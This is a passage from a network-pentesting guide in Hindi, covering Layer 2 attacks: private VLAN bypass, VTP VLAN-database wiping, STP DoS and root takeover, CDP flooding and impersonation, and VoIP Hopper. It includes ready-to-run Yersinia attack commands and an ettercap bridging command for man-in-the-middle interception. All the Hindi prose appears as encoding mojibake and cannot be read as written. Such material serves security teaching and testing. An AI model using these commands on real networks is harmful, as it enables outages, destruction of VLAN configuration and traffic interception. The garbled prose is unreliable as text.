рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдПрдВ, рдФрд░ рдПрдХ IP рдкрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред рдЖрдк рдкрддрд╛ рдХреЛ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ (DHCP) рдорд╛рдВрдЧрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╛рдорд▓реЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

рдХреБрдЫ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдЬреИрд╕реЗ рдХрд┐ рдЕрддрд┐рдерд┐ рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ, **рдкреЛрд░реНрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди (рдЬрд┐рд╕реЗ рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ)** рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд▓рд╛рдЧреВ рдХреА рдЬрд╛рддреА рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╛рдпрд░рд▓реЗрд╕ рдПрдХреНрд╕реЗрд╕ рдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдХ-рджреВрд╕рд░реЗ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рд╕рдВрд╡рд╛рдж рди рдХрд░ рд╕рдХреЗрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдПрдХ рддрдХрдиреАрдХ рдкрд╣рдЪрд╛рдиреА рдЧрдИ рд╣реИ рдЬреЛ рдЗрди рдЖрдЗрд╕реЛрд▓реЗрд╢рди рдЙрдкрд╛рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреА рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рдпрд╛ рддреЛ рдиреЗрдЯрд╡рд░реНрдХ ACLs рдХреА рдХрдореА рдпрд╛ рдЙрдирдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ IP рдкреИрдХреЗрдЯ рдХреЛ рдПрдХ рд░рд╛рдЙрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реВрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕реА рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдПрдХ рдЕрдиреНрдп рдХреНрд▓рд╛рдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗред

рд╣рдорд▓рд╛ рдПрдХ **рдкреИрдХреЗрдЯ рдмрдирд╛рдХрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рд▓рдХреНрд╖реНрдп рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ IP рдкрддрд╛ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд░рд╛рдЙрдЯрд░ рдХрд╛ MAC рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕рд╕реЗ рд░рд╛рдЙрдЯрд░ рдЧрд▓рддреА рд╕реЗ рдкреИрдХреЗрдЯ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рдУрд░ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░ рджреЗрддрд╛ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ рд╣рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╡рд┐рдзрд┐ рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЬрд╣рд╛рдВ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рд╕реБрд▓рдн рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рд╣рдорд▓реЗ рдХреЗ рдореБрдЦреНрдп рдЪрд░рдг:**

1. **рдкреИрдХреЗрдЯ рдмрдирд╛рдирд╛:** рдПрдХ рдкреИрдХреЗрдЯ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ IP рдкрддреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд░рд╛рдЙрдЯрд░ рдХреЗ MAC рдкрддреЗ рдХреЗ рд╕рд╛рдеред
2. **рд░рд╛рдЙрдЯрд░ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛:** рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреИрдХреЗрдЯ рд░рд╛рдЙрдЯрд░ рдХреА рдУрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдХрд╛рд░рдг рдкреИрдХреЗрдЯ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рдУрд░ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдЖрдЗрд╕реЛрд▓реЗрд╢рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

### VTP Attacks

VTP (VLAN рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓) VLAN рдкреНрд░рдмрдВрдзрди рдХреЛ рдХреЗрдВрджреНрд░реАрдХреГрдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдЕрдЦрдВрдбрддрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрди рдирдВрдмрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ; рдХрд┐рд╕реА рднреА рд╕рдВрд╢реЛрдзрди рд╕реЗ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝ рдЬрд╛рддреА рд╣реИред рд╕реНрд╡рд┐рдЪ рдЙрдЪреНрдЪ рд╕рдВрд╢реЛрдзрди рдирдВрдмрд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЕрдкрдирд╛рддреЗ рд╣реИрдВ, рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВред

#### VTP рдбреЛрдореЗрди рднреВрдорд┐рдХрд╛рдПрдБ

* **VTP рд╕рд░реНрд╡рд░:** VLANs рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИтАФрдмрдирд╛рддрд╛ рд╣реИ, рд╣рдЯрд╛рддрд╛ рд╣реИ, рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдбреЛрдореЗрди рд╕рджрд╕реНрдпреЛрдВ рдХреЛ VTP рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **VTP рдХреНрд▓рд╛рдЗрдВрдЯ:** рдЕрдкрдиреЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╕рдордиреНрд╡рдпрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП VTP рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕реНрдерд╛рдиреАрдп VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрдиреЛрдВ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **VTP рдЯреНрд░рд╛рдВрд╕рдкреЗрд░реЗрдВрдЯ:** VTP рдЕрдкрдбреЗрдЯ рдореЗрдВ рднрд╛рдЧ рдирд╣реАрдВ рд▓реЗрддрд╛ рд▓реЗрдХрд┐рди VTP рдШреЛрд╖рдгрд╛рдУрдВ рдХреЛ рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред VTP рд╣рдорд▓реЛрдВ рд╕реЗ рдЕрдкреНрд░рднрд╛рд╡рд┐рдд, рдпрд╣ рд╢реВрдиреНрдп рдХрд╛ рдПрдХ рд╕реНрдерд┐рд░ рд╕рдВрд╢реЛрдзрди рдирдВрдмрд░ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИред

#### VTP рд╡рд┐рдЬреНрдЮрд╛рдкрди рдкреНрд░рдХрд╛рд░

* **рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди:** VTP рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╣рд░ 300 рд╕реЗрдХрдВрдб рдореЗрдВ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рдбреЛрдореЗрди рдЬрд╛рдирдХрд╛рд░реА рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред
* **рдЙрдкрд╕рдореБрдЪреНрдЪрдп рд╡рд┐рдЬреНрдЮрд╛рдкрди:** VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рдмрд╛рдж рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд╡рд┐рдЬреНрдЮрд╛рдкрди рдЕрдиреБрд░реЛрдз:** рдПрдХ VTP рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╡рд┐рдЬреНрдЮрд╛рдкрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдЙрдЪреНрдЪ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВред

VTP рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдХреЗрд╡рд▓ рдЯреНрд░рдВрдХ рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рд▓рд╛рднрдХрд╛рд░реА рд╣реЛрддреА рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ VTP рдШреЛрд╖рдгрд╛рдПрдБ рдХреЗрд╡рд▓ рдЙрдирдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╕рд╛рд░рд┐рдд рд╣реЛрддреА рд╣реИрдВред DTP рд╣рдорд▓реЗ рдХреЗ рдмрд╛рдж рдХреЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ VTP рдХреА рдУрд░ рдореБрдбрд╝рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред Yersinia рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг VTP рд╣рдорд▓реЛрдВ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдорд┐рдЯрд╛рдиреЗ рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рд╕реЗ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВред

рдиреЛрдЯ: рдпрд╣ рдЪрд░реНрдЪрд╛ VTP рд╕рдВрд╕реНрдХрд░рдг 1 (VTPv1) рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
In Yersinia рдХреЗ рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдореЛрдб рдореЗрдВ, VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рднреА VTP vlans рдХреЛ рд╣рдЯрд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдЪреБрдиреЗрдВред

### STP рд╣рдорд▓реЗ

**рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ BPDU рдлреНрд░реЗрдо рдХреИрдкреНрдЪрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рдХрдо рд╣реИ рдХрд┐ рдЖрдк STP рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрдВрдЧреЗред**

#### **STP BPDU DoS**

рдХрдИ BPDUs TCP (Topology Change Notification) рдпрд╛ Conf (рд╡реЗ BPDUs рдЬреЛ рддрдм рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдЬрдм рдЯреЛрдкреЛрд▓реЙрдЬреА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ) рднреЗрдЬрдиреЗ рд╕реЗ рд╕реНрд╡рд┐рдЪ рдУрд╡рд░рд▓реЛрдб рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВред
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

рдЬрдм рдПрдХ TCP рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рдХрд╛ CAM рддрд╛рд▓рд┐рдХрд╛ 15 рд╕реЗрдХрдВрдб рдореЗрдВ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдлрд┐рд░, рдпрджрд┐ рдЖрдк рд▓рдЧрд╛рддрд╛рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рддреЛ CAM рддрд╛рд▓рд┐рдХрд╛ рд▓рдЧрд╛рддрд╛рд░ (рдпрд╛ рд╣рд░ 15 рд╕реЗрдХрдВрдб рдореЗрдВ) рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрдЧреА рдФрд░ рдЬрдм рдпрд╣ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрддреА рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рдПрдХ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

рд╣рдорд▓рд╛рд╡рд░ рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ STP рд░реВрдЯ рдмрди рд╕рдХреЗред рдлрд┐рд░, рдЕрдзрд┐рдХ рдбреЗрдЯрд╛ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛ред рдпрд╣ рддрдм рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдк рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВред\
рдпрд╣ BPDUs CONF рдкреИрдХреЗрдЯ рднреЗрдЬрдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **priority** рдорд╛рди рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдЯ рд╕реНрд╡рд┐рдЪ рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╕реЗ рдХрдо рд╣реИред
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ 2 рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реИрдВ, рддреЛ рд╡рд╣ рдирдП рдкреЗрдбрд╝ рдХрд╛ рдореВрд▓ рдмрди рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрди рд╕реНрд╡рд┐рдЪреЛрдВ рдХреЗ рдмреАрдЪ рд╕рднреА рдЯреНрд░реИрдлрд╝рд┐рдХ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛** (рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP рд╣рдорд▓реЗ

CISCO Discovery Protocol (CDP) CISCO рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ **рдПрдХ-рджреВрд╕рд░реЗ рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╡рд┐рд╡рд░рдг рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХреЗрдВ**ред

#### рдкреИрд╕рд┐рд╡ рдбреЗрдЯрд╛ рд╕рдВрдЧреНрд░рд╣ <a href="#id-0e0f" id="id-0e0f"></a>

CDP рд╕рднреА рдкреЛрд░реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░, рдЬрдм рдПрдХ рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **Wireshark**, **tcpdump**, рдпрд╛ **Yersinia** рдЬреИрд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд╝рд░реНрд╕ рдХреЛ рддреИрдирд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХреНрд░рд┐рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЗрд╕рдХрд╛ рдореЙрдбрд▓ рдФрд░ рдпрд╣ рдХрд┐рд╕ Cisco IOS рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рд╢рд╛рдорд┐рд▓ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдкрд╣рдЪрд╛рдиреЗ рдЧрдП Cisco IOS рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### CDP рдЯреЗрдмрд▓ рдмрд╛рдврд╝ рдХреЛ рдкреНрд░реЗрд░рд┐рдд рдХрд░рдирд╛ <a href="#id-0d6a" id="id-0d6a"></a>

рдПрдХ рдЕрдзрд┐рдХ рдЖрдХреНрд░рд╛рдордХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдЕрдзрд┐рднрд╛рд░рд┐рдд рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рд╕реЗ рдЗрдирдХрд╛рд░ (DoS) рд╣рдорд▓реЗ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рд╡реИрдз CISCO рдЙрдкрдХрд░рдгреЛрдВ рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред рдиреАрдЪреЗ Yersinia рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рддрд░рд╣ рдХреЗ рд╣рдорд▓реЗ рдХреЛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрджреЗрд╢ рдЕрдиреБрдХреНрд░рдо рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рджреМрд░рд╛рди, рд╕реНрд╡рд┐рдЪ рдХрд╛ CPU рдФрд░ CDP рдкрдбрд╝реЛрд╕реА рддрд╛рд▓рд┐рдХрд╛ рднрд╛рд░реА рдмреЛрдЭ рдореЗрдВ рд╣реЛрддреА рд╣реИ, рдЬреЛ рдЕрддреНрдпрдзрд┐рдХ рд╕рдВрд╕рд╛рдзрди рдЦрдкрдд рдХреЗ рдХрд╛рд░рдг рдЕрдХреНрд╕рд░ **тАЬрдиреЗрдЯрд╡рд░реНрдХ рд▓рдХрд╡рд╛рдЧреНрд░рд╕реНрддтАЭ** рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
рдЖрдк [**scapy**](https://github.com/secdev/scapy/) рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдЗрд╕реЗ `scapy/contrib` рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред

### VoIP рд╣рдорд▓реЗ рдФрд░ VoIP Hopper рдЙрдкрдХрд░рдг

VoIP рдлреЛрди, рдЬреЛ IoT рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдмрдврд╝рддреЗ рд╣реБрдП рдПрдХреАрдХреГрдд рд╣реЛрддреЗ рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рдлреЛрди рдирдВрдмрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджрд░рд╡рд╛рдЬреЗ рдЦреЛрд▓рдиреЗ рдпрд╛ рдерд░реНрдореЛрд╕реНрдЯреИрдЯреНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдЬреИрд╕реА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдПрдХреАрдХрд░рдг рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЙрдкрдХрд░рдг [**voiphopper**](http://voiphopper.sourceforge.net) рд╡рд┐рднрд┐рдиреНрди рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ (Cisco, Avaya, Nortel, Alcatel-Lucent) рдореЗрдВ VoIP рдлреЛрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ CDP, DHCP, LLDP-MED, рдФрд░ 802.1Q ARP рдЬреИрд╕реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЙрдпрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ VLAN ID рдЦреЛрдЬрддрд╛ рд╣реИред

**VoIP Hopper** Cisco Discovery Protocol (CDP) рдХреЗ рд▓рд┐рдП рддреАрди рдореЛрдб рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

1. **Sniff Mode** (`-c 0`): VLAN ID рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИред
